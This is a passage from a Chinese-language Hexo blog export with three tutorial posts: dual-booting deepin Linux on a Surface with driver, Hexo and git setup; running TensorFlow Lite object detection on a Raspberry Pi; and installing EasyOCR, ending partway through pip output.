<h2 id="linux操作系统介绍"><a href="#linux操作系统介绍" class="headerlink" title="linux操作系统介绍"></a>linux操作系统介绍</h2><h3 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h3><p>作为全球最流行且最有影响力的Linux开源系统之一，Ubuntu自发布以来在应用体验方面：有较大幅度的提升，即使对比Windows、MacOS等操作系统，最新版本的Ubuntu也不逊色。<br><img src="https://ss3.bdstatic.com/70cFv8Sh_Q1YnxGkpoWK1HF6hhy/it/u=3931899733,1893021162&amp;fm=26&amp;gp=0.jpg" alt="">  </p>
<h3 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h3><p>Kali Linux是基于Debian的Linux发行版， 设计用于数字取证操作系统。每一季度更新一次。由Offensive Security Ltd维护和资助。最先由Offensive Security的Mati Aharoni和Devon Kearns通过重写BackTrack来完成，BackTrack是他们之前写的用于取证的Linux发行版 。</p>
<p>主要是用来渗透网络—所以俗话说kali从入门到入狱。</p>
<p><img src="https://bkimg.cdn.bcebos.com/pic/3b87e950352ac65c1038fd5662baa5119313b07e1cf7?x-bce-process=image/watermark,image_d2里奴性F0ZXIvYmFpa2UxNTA=,g_7,xp_5,yp_5/format,f_auto" alt=""></p>
<h3 id="Elementary-OS"><a href="#Elementary-OS" class="headerlink" title="Elementary OS"></a>Elementary OS</h3><p>Elementary OS是基于 Ubuntu 精心打磨美化的桌面 Linux 发行版的一款软件，号称 “最美的 Linux”， 最早是 Ubuntu 的一个美化主题项目，现在成了独立的发行版<br><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fww2.sinaimg.cn%2Fmw1024%2F6595c7c6tw1e7nlcg38qoj211s0lcag0.jpg&amp;refer=http%3A%2F%2Fwww.sina.com&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=jpeg?sec=1618754413&amp;t=c4cc435286c020b6845bd352d5a1dd8c" alt=""></p>
<h3 id="Chrome-OS"><a href="#Chrome-OS" class="headerlink" title="Chrome OS"></a>Chrome OS</h3><p>Chrome OS是一款Google开发的基于PC的操作系统。 Google Chrome OS是一款基于Linux的开源操作系统。Google在自己的官方博客表示，初期，这一操作系统将定位于上网本、紧凑型以及低成本电脑。这款开源软件将被命名为Chrome OS，谷歌公司于2010年12里奴性月7日（北京时间12月8日2点30分）在美国举行Chrome相关产品发布会，发布会上正式发布Chrome Web store和Chrome OS。</p>
<p><img src="https://gss0.baidu.com/70cFfyinKgQFm2e88IuM_a/baike/pic/item/8694a4c27d1ed21bae953dafa06eddc451da3f1f.jpg" alt=""></p>
<h3 id="deepin"><a href="#deepin" class="headerlink" title="deepin"></a>deepin</h3><p>Deepin（原名：Linux Deepin；中文通称：深度操作系统）是由武汉深之度科技有限公司在Debian基础上开发的Linux操作系统，其前身是Hiweed Linux操作系统，于2004年2月28日开始对外发行，可以安装在个人计算机和服务器中。</p>
<p>Deepin 12.12 正式版本将搭载一个全新的桌面环境。该桌面环境由Deepin 团队开发，以轻型、美观、稳定等作为设计目标。新桌面环境使用 Compiz 作为默认的窗口管理器。<br><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fzkres1.myzaker.com%2F201910%2F5dae5906b15ec02e1c28f7b1_1024.jpg&amp;refer=http%3A%2F%2Fzkres1.myzaker.com&amp;app=2002&amp;size=f9999,10000&amp;q=a80&amp;n=0&amp;g=0n&amp;fmt=jpeg?sec=1618754739&amp;t=be9f54a43670d51053a30eec7d91ac18" alt=""></p>
<h3 id="总结以上五种系统各有各的优点"><a href="#总结以上五种系统各有各的优点" class="headerlink" title="总结以上五种系统各有各的优点"></a>总结以上五种系统各有各的优点</h3><p>运行上deepin会更慢一些，因为deepin的界面做的最好看，其次deepin是国产linux系统，而且是武汉的公司，安装极其简单，所以我就装了deepin操作系统。</p>
<h2 id="deepin启动盘制作"><a href="#deepin启动盘制作" class="headerlink" title="deepin启动盘制作"></a>deepin启动盘制作</h2><p>deepin v20下载地址<a href="https://www.deepin.org/zh/download/">deep in</a><br>首先下载镜像，其次下载启动盘制作工具，制作启动盘。</p>
<h2 id="windows分区"><a href="#windows分区" class="headerlink" title="windows分区"></a>windows分区</h2><p>删除一些windows上面不需要的软件和文件，腾出50G的空间，然后通过<a href="https://www.soft-down.net/detail/44/431115.shtml?type=jingzhun">分区助手</a><br>对磁盘进行分区。</p>
<h2 id="系统安装具体操作步骤"><a href="#系统安装具体操作步骤" class="headerlink" title="系统安装具体操作步骤"></a>系统安装具体操作步骤</h2><p>1.制作启动u盘deepin系统安装盘。就是把deepin.iso烧录到u盘上。<br>这里请一定要先记得在淘宝上买一个扩展坞，因为surface是一款pc平板而合一电脑，为了节约面积，采用了单usb端口。同时安装系统时蓝牙会失效，需要准备有线鼠标、有线键盘。</p>
<p>2.关闭secureboot.关机后 音量下键+电源三秒，松开电源，见到surface图标后松开音量键进入bios界面。第二项 secureboot 回车 disable它。滑倒最后exit save setting。</p>
<p>特别注意一点！就是分清楚surface的音量和电源在那不要按错。</p>
<p>3.进入windows系统，点击setting，在setting 中搜索boot，看到第二项，create and format hard disk partitions. 进入后看到C盘，鼠标右键shrink volumn(分出给deepin 的空间）</p>
<p>建议采用之前说的分区助手，这种方法分区很容易崩。</p>
<p>4.从U盘启动。有两种方式：<br>第一种关机后，音量下键+电源3秒，松开电源。见到surface画面后松开音量键。<br>第二种从windows 向左滑，进入setting. 最底下change pc settings.进去后点击最底下的updates and recovery(更新和恢复）选择里面最底下选项。advanced startup. （高级启动）。进入U盘启动。</p>
<p>5.从U盘启动后。选择第二项，安装deepin. 选择语言，然后选择something else(其他选项）。目的是不要覆盖windows系统。安装系统到我们分出的free space里。<br>点击 free space ，再点击左下角的“+”号。选择逻辑分区，ext4, 给/root.尽量大点。</p>
<p>再点击 free space ，点击左下角的“+”号。逻辑或主分区随便（我给的逻辑分区），swap area(交换空间）.随便给个几G。英文教程中不给，我是分了，省得它提示我必须给。反正也不少这几个G。</p>
<p>选择启动盘为windows 所在的那个，一般叫sda 4.</p>
<p>然后开始安装。重启。</p>
<h2 id="安装触摸屏驱动"><a href="#安装触摸屏驱动" class="headerlink" title="安装触摸屏驱动"></a>安装触摸屏驱动</h2><h3 id="deepin-1"><a href="#deepin-1" class="headerlink" title="deepin"></a>deepin</h3><p>这里很神奇如果你也装的是deepin操作系统，触摸屏是可以直接使用的，可能因为华为封锁，目前华为用的均为deepin操作系统，华为也有触控笔记本电脑。</p>
<h3 id="其他linux系统"><a href="#其他linux系统" class="headerlink" title="其他linux系统"></a>其他linux系统</h3><p>请详见<a href="https://github.com/jakeday/linux-surface">github大神</a>的surface驱动安装教程。</p>
<p>进入系统以后使用Terminal安装了Peter Hunter整理的内核<br><pre class="line-numbers language-none"><code class="language-none">sudo add-apt-repository ppa:tigerite&#x2F;kernel

sudo apt-get update

sudo apt-get install linux-surface<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>然后使用编辑器nano或者gedit编辑/<br><pre class="line-numbers language-none"><code class="language-none">lib&#x2F;udev&#x2F;rules.d&#x2F;50-bluetooth-hci-auto-poweron.rules<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>用#注释掉里面唯一的那一行，再打开/etc/bluetooth/main.conf<br>把#[Policy]<br>改成[Policy]<br>并把最后一排的<br><pre class="line-numbers language-none"><code class="language-none">#AutoEnable&#x3D;false改成AutoEnable&#x3D;true
&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;安装rEFIndsudo

apt-add-repository ppa:rodsmith&#x2F;refind

sudo apt-get update

sudo apt-get install refind<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>用Shim给rEFind增加Secure Boot的启动方式<br><pre class="line-numbers language-none"><code class="language-none">refind-install --shim &#x2F;boot&#x2F;efi&#x2F;EFI&#x2F;ubuntu&#x2F;shimx64.efi --localkeys<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>然后把rEFind设为第一启动项refind-mkdefault开启Secure Boot</p>
<h2 id="蓝牙驱动安装"><a href="#蓝牙驱动安装" class="headerlink" title="蓝牙驱动安装"></a>蓝牙驱动安装</h2><p>蓝牙（Bluetooth），是一种无线个人局域网（Wireless PAN），最初由爱立信创制，后来由蓝牙技术联盟订定技术标准。这个词的来源是10世纪丹麦和挪威国王蓝牙哈拉尔（丹麦语：Harald Blåtand Gormsen），借国王的绰号“Blåtand”当名称，直接翻译成中文为“蓝牙”（blå＝蓝，tand＝牙）。蓝牙是一种通用的射频频率是2.45GHZ的无线电接口，它使带有电子端口的设备能够在小范围内进行无线通信。</p>
<h3 id="安装应用"><a href="#安装应用" class="headerlink" title="安装应用"></a>安装应用</h3><p>Blueman旨在提供最为常见的蓝牙管理功能。</p>
<p>命令安装，终端执行：<br><pre class="line-numbers language-none"><code class="language-none">sudo apt-get install blueman
&#96;&#96;&#96;&#96;
命令卸载，终端执行：<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br>sudo apt-get remove blueman<br><pre class="line-numbers language-none"><code class="language-none">
## Hexo安装
### 安装nodejs:生成静态页面<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br>sudo apt-get install nodejs<br><pre class="line-numbers language-none"><code class="language-none">### 安装npm：一会用来安装hexo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>sudo apt-get insall npm<br><pre class="line-numbers language-none"><code class="language-none">### 正式安装hexo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>sudo npm install -g hexo<br><pre class="line-numbers language-none"><code class="language-none">### hexo部署<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>hexo clean<br>hexo g-d<br><pre class="line-numbers language-none"><code class="language-none">## git SSH Linux

打开终端依次输入一下命令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br>Git Bash Here</p>
<p>mkdir ~/.ssh</p>
<p>cd .ssh/</p>
<p>git config —global  user.name “mmrsl”</p>
<p>git config —global  user.email “xxx@codekp.cn”<br>```<br>打开id_rsa.pub，在github的账号中进行修改，增加SHH。</p>
<h1 id="完成后上传，如本文所示，surface双系统完美linux。"><a href="#完成后上传，如本文所示，surface双系统完美linux。" class="headerlink" title="完成后上传，如本文所示，surface双系统完美linux。"></a>完成后上传，如本文所示，surface双系统完美linux。</h1>]]></content>
      <categories>
        <category>linux</category>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>Deep in</tag>
        <tag>surface</tag>
      </tags>
  </entry>
  <entry>
    <title>Detection_树莓派</title>
    <url>/2021/06/07/Detection-%E6%A0%91%E8%8E%93%E6%B4%BE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Raspberry-Pi-上运行-TensorFlow-Lite-目标检测"><a href="#Raspberry-Pi-上运行-TensorFlow-Lite-目标检测" class="headerlink" title="Raspberry Pi 上运行 TensorFlow Lite 目标检测"></a>Raspberry Pi 上运行 TensorFlow Lite 目标检测</h1> <div style="position:relative; padding-bottom:75%; width:100%; height:0">
    <iframe src="//player.bilibili.com/player.html?aid=845957427&bvid=BV1B54y137xE&cid=350441154&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position:absolute; height: 100%; width: 100%;"> </iframe>
</div>

<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>本指南提供了有关如何在 Raspberry Pi 上设置 TensorFlow Lite 并使用它运行对象检测模型的分步说明。它还展示了如何在 Pi 上设置 Coral USB 加速器并运行 Edge TPU 检测模型。它适用于运行 Rasbpian Buster 或 Rasbpian Stretch 的 Raspberry Pi 3 和 Raspberry Pi 4。</p>
<p>本指南是我更大的 TensorFlow Lite 教程系列的第二部分：</p>
<ol>
<li><a href="https://github.com/EdjeElectronics/TensorFlow-Lite-Object-Detection-on-Android-and-Raspberry-Pi#part-1---how-to-train-convert-and-run-custom-tensorflow-lite-object-detection-models-on-windows-10">如何在 Windows 10 上训练、转换和运行自定义 TensorFlow Lite 对象检测模型</a></li>
<li>如何在 Raspberry Pi 上运行 TensorFlow Lite 对象检测模型&lt;—- 你在这里！</li>
</ol>
<p>本指南的这一部分分为三个部分：</p>
<ul>
<li><a href="https://github.com/EdjeElectronics/TensorFlow-Lite-Object-Detection-on-Android-and-Raspberry-Pi/blob/master/Raspberry_Pi_Guide.md#part-1---how-to-set-up-and-run-tensorflow-lite-object-detection-models-on-the-raspberry-pi">第 1 节 在 Raspberry Pi 上运行 TensorFlow Lite 对象检测模型</a></li>
<li><a href="https://github.com/EdjeElectronics/TensorFlow-Lite-Object-Detection-on-Android-and-Raspberry-Pi/blob/master/Raspberry_Pi_Guide.md#section-2---run-edge-tpu-object-detection-models-on-the-raspberry-pi-using-the-coral-usb-accelerator">第 2 节。使用 Coral USB 加速器在 Raspberry Pi 上运行 Edge TPU 对象检测模型</a></li>
</ul>
<p>此存储库还包括用于在图像、视频或网络摄像头/Picamera 源上运行 TFLite 和 Edge TPU 模型的脚本。</p>
<h2 id="如何在-Raspberry-Pi-上设置和运行-TensorFlow-Lite-对象检测模型"><a href="#如何在-Raspberry-Pi-上设置和运行-TensorFlow-Lite-对象检测模型" class="headerlink" title="如何在 Raspberry Pi 上设置和运行 TensorFlow Lite 对象检测模型"></a>如何在 Raspberry Pi 上设置和运行 TensorFlow Lite 对象检测模型</h2><p>在 Raspberry Pi 上设置 TensorFlow Lite 比常规 TensorFlow 容易得多！这些是设置 TensorFlow Lite 所需的步骤：</p>
<ul>
<li>1a. 更新树莓派</li>
<li>1b. 下载此存储库并创建虚拟环境</li>
<li>1c。安装 TensorFlow 和 OpenCV</li>
<li>1天。设置 TensorFlow Lite 检测模型</li>
<li>1e。运行 TensorFlow Lite 模型！</li>
<li>我还制作了一个介绍本指南的 YouTube 视频：</li>
</ul>
<p><a href="https://www.youtube.com/watch?v=aimSGOAUI8Y"><img src="https://raw.githubusercontent.com/EdjeElectronics/TensorFlow-Lite-Object-Detection-on-Android-and-Raspberry-Pi/master/doc/YouTube_video1.JPG" alt="Link to my YouTube video!"></a></p>
<h3 id="更新树莓派"><a href="#更新树莓派" class="headerlink" title="更新树莓派"></a>更新树莓派</h3><pre class="line-numbers language-none"><code class="language-none">sudo apt-get update
sudo apt-get dist-upgrade<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>根据您更新 Pi 的时间，更新可能需要一分钟到一小时之间的任何时间。</p>
<p>在此过程中，让我们确保在 Raspberry Pi 配置菜单中启用了相机界面。单击屏幕左上角的 Pi 图标，选择 Preferences -&gt; Raspberry Pi Configuration，然后转到 Interfaces 选项卡并确认 Camera 设置为 Enabled。如果不是，请立即启用它，然后重新启动 Raspberry Pi。</p>
<h3 id="下载虚拟环境"><a href="#下载虚拟环境" class="headerlink" title="下载虚拟环境"></a>下载虚拟环境</h3><p>接下来，通过发出以下命令克隆此 GitHub 存储库。该存储库包含我们将用于运行 TensorFlow Lite 的脚本，以及一个使安装一切变得更容易的 shell 脚本。问题：</p>
<pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;EdjeElectronics&#x2F;TensorFlow-Lite-Object-Detection-on-Android-and-Raspberry-Pi.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这会将所有内容下载到名为 TensorFlow-Lite-Object-Detection-on-Android-and-Raspberry-Pi 的文件夹中。这有点长，所以将文件夹重命名为“tflite1”，然后 cd 进入它：</p>
<pre class="line-numbers language-none"><code class="language-none">mv TensorFlow-Lite-Object-Detection-on-Android-and-Raspberry-Pi tflite1
cd tflite1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>我们将在此 /home/pi/tflite1 目录中处理本指南的其余部分。接下来是创建一个名为“tflite1-env”的虚拟环境。</p>
<p>我在本指南中使用了虚拟环境，因为它可以防止可能已安装在您的 Pi 上的软件包库版本之间发生任何冲突。将 TensorFlow 安装在自己的环境中可以避免版本冲突。例如，如果您已经使用我的其他指南在 Pi 上安装了 TensorFlow v1.8，则可以保持该安装不变，而不必担心覆盖它。</p>
<p>通过发出以下命令安装 virtualenv：</p>
<pre class="line-numbers language-none"><code class="language-none">sudo pip3 install virtualenv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后，通过发出以下命令创建“tflite1-env”虚拟环境：</p>
<pre class="line-numbers language-none"><code class="language-none">python3 -m venv tflite1-env<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这将在 tflite1 目录中创建一个名为 tflite1-env 的文件夹。tflite1-env 文件夹将保存此环境的所有包库。接下来，通过发出以下命令激活环境：</p>
<pre class="line-numbers language-none"><code class="language-none">source tflite1-env&#x2F;bin&#x2F;activate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><strong>source tflite1-env/bin/activate每次打开新的终端窗口时，您都需要从 /home/pi/tflite1 目录中发出命令以重新激活环境。您可以通过检查 (tflite1-env) 是否出现在命令提示符中的路径之前来判断环境何时处于活动状态，如下面的屏幕截图所示。</strong></p>
<p>此时，如果您发出 .tflite1 目录，那么您的 tflite1 目录应该是这样的<code>ls</code>。</p>
<h3 id="安装TensorFlow和opencv"><a href="#安装TensorFlow和opencv" class="headerlink" title="安装TensorFlow和opencv"></a>安装TensorFlow和opencv</h3><p>接下来，我们将安装 TensorFlow、OpenCV 以及这两个包所需的所有依赖项。运行 TensorFlow Lite 不需要 OpenCV，但此存储库中的对象检测脚本使用它来抓取图像并在其上绘制检测结果。</p>
<p>为了让事情更简单，我编写了一个 shell 脚本，它会自动下载并安装所有的包和依赖项。通过发出以下命令运行它：</p>
<pre class="line-numbers language-none"><code class="language-none">bash get_pi_requirements.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这将下载大约 400MB 的安装文件，因此需要一段时间。在它工作的时候去喝杯咖啡吧！如果您想查看已安装的所有内容，只需打开 get_pi_dependencies.sh 即可查看软件包列表。</p>
<p><strong>注意：如果您在运行bash get_pi_requirements.sh命令时遇到错误，可能是因为您的 Internet 连接超时，或者因为下载的包数据已损坏。如果出现错误，请尝试重新运行该命令几次。</strong></p>
<p><strong>另一个注意事项：shell 脚本会自动安装最新版本的 TensorFlow。如果您想安装特定版本，pip3 install tensorflow==X.XX请在运行脚本后发出（其中 X.XX 替换为您要安装的版本）。这将使用指定版本覆盖现有安装。</strong></p>
<p>那很简单！进入下一步。</p>
<h3 id="步骤-1d。设置-TensorFlow-Lite-检测模型"><a href="#步骤-1d。设置-TensorFlow-Lite-检测模型" class="headerlink" title="步骤 1d。设置 TensorFlow Lite 检测模型"></a>步骤 1d。设置 TensorFlow Lite 检测模型</h3><p>接下来，我们将设置将与 TensorFlow Lite 一起使用的检测模型。本指南展示了如何下载由 Google 提供的示例 TFLite 模型，或如何使用您按照我的 TensorFlow Lite 教程系列<a href="https://github.com/EdjeElectronics/TensorFlow-Lite-Object-Detection-on-Android-and-Raspberry-Pi#part-1---how-to-train-convert-and-run-custom-tensorflow-lite-object-detection-models-on-windows-10">第 1 部分自行训练的模型</a>。</p>
<p>检测模型有两个与之关联的文件：detect.tflite 文件（模型本身）和 labelmap.txt 文件（为模型提供标签图）。我组织模型文件的首选方法是创建一个文件夹（例如“BirdSquirrelRaccoon_TFLite_model”）并将detect.tflite 和labelmap.txt 都保存在该文件夹中。这也是 Google 的可下载示例 TFLite 模型的组织方式。</p>
<h3 id="选项-1-使用-Google-的示例-TFLite-模型"><a href="#选项-1-使用-Google-的示例-TFLite-模型" class="headerlink" title="选项 1. 使用 Google 的示例 TFLite 模型"></a>选项 1. 使用 Google 的示例 TFLite 模型</h3><p>Google 提供了一个示例量化 SSDLite-MobileNet-v2 对象检测模型，该模型在 MSCOCO 数据集上训练并转换为在 TensorFlow Lite 上运行。它可以检测和识别 80 种不同的常见物体，例如人、汽车、杯子等。</p>
<p>通过发出以下命令下载示例模型（<a href="https://www.tensorflow.org/lite/models/object_detection/overview">可以在TensorFlow 官方网站的对象检测页面上找到</a>）：<br><pre class="line-numbers language-none"><code class="language-none">wget https:&#x2F;&#x2F;storage.googleapis.com&#x2F;download.tensorflow.org&#x2F;models&#x2F;tflite&#x2F;coco_ssd_mobilenet_v1_1.0_quant_2018_06_29.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>通过发出（此命令自动创建文件夹）将其解压缩到名为“Sample_TFLite_model”的文件夹中：<br><pre class="line-numbers language-none"><code class="language-none">unzip coco_ssd_mobilenet_v1_1.0_quant_2018_06_29.zip -d Sample_TFLite_model<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>好的，示例模型已准备就绪！</p>
<h3 id="选项-2：使用您自己的自定义训练模型"><a href="#选项-2：使用您自己的自定义训练模型" class="headerlink" title="选项 2：使用您自己的自定义训练模型"></a>选项 2：使用您自己的自定义训练模型</h3><p>您还可以通过将模型文件夹移动到 /home/pi/tflite 目录来使用自定义对象检测模型。如果您按照我的 <a href="https://github.com/EdjeElectronics/TensorFlow-Lite-Object-Detection-on-Android-and-Raspberry-Pi#part-1---how-to-train-convert-and-run-custom-tensorflow-lite-object-detection-models-on-windows-10">TensorFlow Lite 指南的第 1 部分</a>在您的 PC 上训练和转换 TFLite 模型，您应该有一个名为“TFLite_model”的文件夹，其中包含一个 detect.tflite 和 labelmap.txt 文件。（它还会有一个 tflite_graph.pb 和 tflite_graph.pbtxt 文件，TensorFlow Lite 不需要这些文件，但可以留在文件夹中。）</p>
<p>您可以简单地将该文件夹复制到 USB 驱动器，将 USB 驱动器插入您的 Raspberry Pi，然后将该文件夹移动到 /home/pi/tflite1 目录中。（或者，您可以通过电子邮件将其发送给自己，或将其放在 Google 云端硬盘上，或者使用您喜欢的任何文件传输方法。）这是我的 /home/pi/tflite1 目录中的“BirdSquirrelRaccoon_TFLite_model”文件夹的示例：</p>
<p>现在您的自定义模型已准备就绪！</p>
<h3 id="步骤-1e。运行-TensorFlow-Lite-模型！"><a href="#步骤-1e。运行-TensorFlow-Lite-模型！" class="headerlink" title="步骤 1e。运行 TensorFlow Lite 模型！"></a>步骤 1e。运行 TensorFlow Lite 模型！</h3><p>是时候看看 TFLite 对象检测模型的实际效果了！首先，通过关闭您不使用的任何应用程序来释放内存和处理能力。另外，请确保您已插入网络摄像头或 Picamera。</p>
<p>通过从 /home/pi/tflite1 目录中发出以下命令来运行实时网络摄像头检测脚本。（在运行该命令之前，通过检查 (tflite1-env) 出现在命令提示符前面来确保 tflite1-env 环境处于活动状态。）<strong>TFLite_detection_webcam.py 脚本将与 Picamera 或 USB 网络摄像头一起使用。</strong></p>
<pre class="line-numbers language-none"><code class="language-none">python3 TFLite_detection_webcam.py --modeldir&#x3D;Sample_TFLite_model<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>如果您的模型文件夹的名称与“Sample_TFLite_model”不同，请改用该名称。例如，我会<code>--modeldir=BirdSquirrelRaccoon_TFLite_model</code>用来运行我的自定义鸟类、松鼠和浣熊检测模型。</p>
<p>初始化片刻后，将出现一个窗口，显示网络摄像头源。检测到的对象将实时显示边界框和标签。</p>
<p>我TensorFlow精简版培训指导的第3部分给出的<a href="https://github.com/EdjeElectronics/TensorFlow-Lite-Object-Detection-on-Android-and-Raspberry-Pi#video">指令</a>使用TFLite_detection_image.py和TFLite_detection_video.py脚本。确保在运行脚本时使用<code>python3</code>而不是<code>python</code>。</p>
]]></content>
      <categories>
        <category>研究生课程</category>
      </categories>
      <tags>
        <tag>树莓派</tag>
        <tag>深度学习</tag>
      </tags>
  </entry>
  <entry>
    <title>EasyOCR光学字符识别</title>
    <url>/2021/10/25/EasyOCR%E5%85%89%E5%AD%A6%E5%AD%97%E7%AC%A6%E8%AF%86%E5%88%AB/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="EasyOCR光学字符识别"><a href="#EasyOCR光学字符识别" class="headerlink" title="EasyOCR光学字符识别"></a>EasyOCR光学字符识别</h1><pre><code>OCR光学字符识别，将不同类型的文档，图像中的字符保存为可编辑和可搜索的数据。
</code></pre><h2 id="EasyOCR"><a href="#EasyOCR" class="headerlink" title="EasyOCR"></a>EasyOCR</h2><p>EasyOCR是python的一个包，将pytorch作为后端处理程序，EasyOCR 像任何其他 OCR（Google 的 tesseract 或任何其他）一样检测图像中的文本，但我在使用它时，我发现它是从图像中检测文本的最直接的方法，而且它将 PyTorch 作为后端处理程序，准确性更可靠。<br>EasyOCR 支持 42 多种语言进行检测。EasyOCR 是由 Jaided AI 公司创建的。</p>
<ul>
<li>预安装 pytorch，安装过程<a href="https://www.codekp.cn/2021/10/22/ubuntu-NVIDIA30xx%E6%98%BE%E5%8D%A1%E5%AE%89%E8%A3%85/">参考ubuntu_NVIDIA30xx，开发环境显卡安装</a></li>
</ul>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>在经历上述过程后，很容易安装EasyOCR，运行以下命令：<br><pre class="line-numbers language-none"><code class="language-none">pip3 install easyocr
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>输出结果：<br><pre class="line-numbers language-none"><code class="language-none">Collecting easyocr
  Using cached easyocr-1.4.1-py3-none-any.whl (63.6 MB)
Collecting python-bidi
  Using cached python_bidi-0.4.2-py2.py3-none-any.whl (30 kB)
Collecting scikit-image
  Downloading scikit_image-0.17.2-cp36-cp36m-win_amd64.whl (11.5 MB)
     |████████████████████████████████| 11.5 MB 211 kB&#x2F;s
Requirement already satisfied: PyYAML in d:\users\vadmin\anaconda3\envs\pytorch\lib\site-packages (from easyocr) (5.4.1)
Requirement already satisfied: numpy in d:\users\vadmin\anaconda3\envs\pytorch\lib\site-packages (from easyocr) (1.19.5)
Requirement already satisfied: torch in d:\users\vadmin\anaconda3\envs\pytorch\lib\site-packages (from easyocr) (1.9.0)
Requirement already satisfied: scipy in d:\users\vadmin\anaconda3\envs\pytorch\lib\site-packages (from easyocr) (1.5.4)
Collecting opencv-python-headless
  Downloading opencv_python_headless-4.5.4.58-cp36-cp36m-win_amd64.whl (35.0 MB)
     |████████████████████████████████| 35.0 MB 338 kB&#x2F;s
Requirement already satisfied: torchvision&gt;&#x3D;0.5 in d:\users\vadmin\anaconda3\envs\pytorch\lib\site-packages (from easyocr) (0.10.0)
Requirement already satisfied: Pillow&lt;8.3.0 in d:\users\vadmin\anaconda3\envs\pytorch\lib\site-packages (from easyocr) (8.2.0)
Requirement already satisfied: typing_extensions in d:\users\vadmin\anaconda3\envs\pytorch\lib\site-packages (from torch-&gt;easyocr) (3.7.4.3)
Requirement already satisfied: dataclasses in d:\users\vadmin\anaconda3\envs\pytorch\lib\site-packages (from torch-&gt;easyocr) (0.8)
Requirement already satisfied: six in d:\users\vadmin\anaconda3\envs\pytorch\lib\site-packages (from python-bidi-&gt;easyocr) (1.16.0)
Requirement already satisfied: imageio&gt;&#x3D;2.3.0 in d:\users\vadmin\anaconda3\envs\pytorch\lib\site-packages (from scikit-image-&gt;easyocr) (2.9.0)
Requirement already satisfied: matplotlib!&#x3D;3.0.0,&gt;&#x3D;2.0.0 in d:\users\vadmin\anaconda3\envs\pytorch\lib\site-packages (from scikit-image-&gt;easyocr) (3.3.4)
Collecting tifffile&gt;&#x3D;2019.7.26
  Downloading tifffile-2020.9.3-py3-none-any.whl (148 kB)
     |████████████████████████████████| 148 kB ...
Collecting networkx&gt;&#x3D;2.0
  Downloading networkx-2.5.1-py3-none-any.whl (1.6 MB)
     |████████████████████████████████| 1.6 MB 6.4 MB&#x2F;s
Requirement already satisfied: PyWavelets&gt;&#x3D;1.1.1 in d:\users\vadmin\anaconda3\envs\pytorch\lib\site-packages (from scikit-image-&gt;easyocr) (1.1.1)
Requirement already satisfied: kiwisolver&gt;&#x3D;1.0.1 in d:\users\vadmin\anaconda3\envs\pytorch\lib\site-packages (from matplotlib!&#x3D;3.0.0,&gt;&#x3D;2.0.0-&gt;scikit-image-&gt;easyocr) (1.3.1)
Requirement already satisfied: pyparsing!&#x3D;2.0.4,!&#x3D;2.1.2,!&#x3D;2.1.6,&gt;&#x3D;2.0.3 in d:\users\vadmin\anaconda3\envs\pytorch\lib\site-packages (from matplotlib!&#x3D;3.0.0,&gt;&#x3D;2.0.0-&gt;scikit-image-&gt;easyocr) (2.4.7)
Requirement already satisfied: cycler&gt;&#x3D;0.10 in d:\users\vadmin\anaconda3\envs\pytorch\lib\site-packages (from matplotlib!&#x3D;3.0.0,&gt;&#x3D;2.0.0-&gt;scikit-image-&gt;easyocr) (0.10.0)
Requirement already satisfied: python-dateutil&gt;&#x3D;2.1 in d:\users\vadmin\anaconda3\envs\pytorch\lib\site-packages (from matplotlib!&#x3D;3.0.0,&gt;&#x3D;2.0.0-&gt;scikit-image-&gt;easyocr) (2.8.1)
Collecting decorator&lt;5,&gt;&#x3D;4.3
  Downloading decorator-4.4.2-py2.py3-none-any.whl (9.2 kB)
Installing collected packages: decorator, tifffile, networkx, scikit-image, python-bidi, opencv-python-headless, easyocr
